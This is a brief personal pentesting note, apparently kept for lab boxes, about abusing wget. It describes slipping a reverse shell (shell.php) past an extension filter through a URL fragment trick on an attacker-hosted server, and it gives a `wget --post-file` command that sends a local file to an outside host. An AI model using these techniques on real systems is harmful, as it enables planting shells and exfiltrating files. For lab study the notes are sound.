- When using wget the default user agent used  ![[Pasted image 20240201131052.png]]
- If there is  some filtering we can bypass it . It’s using Wget! If the application is just calling it with `exec()` or `system()`, maybe we can pull some shell shenanigans, to trick it into downloading our reverse shell, while keeping the `.php` file extension. I put in `http://10.10.14.144:8000/shell.php#a.jpg` as the URL. The PHP script will see the `.jpg` at the end, and accept it. However, the shell will ignore everything after the `#`, and Wget will ultimately download shell.php.
- wget file upload esclation
```
wget --post-file=$LFILE $URL
```

- Network devices do what we tell them to do , not what we think they should do 
  

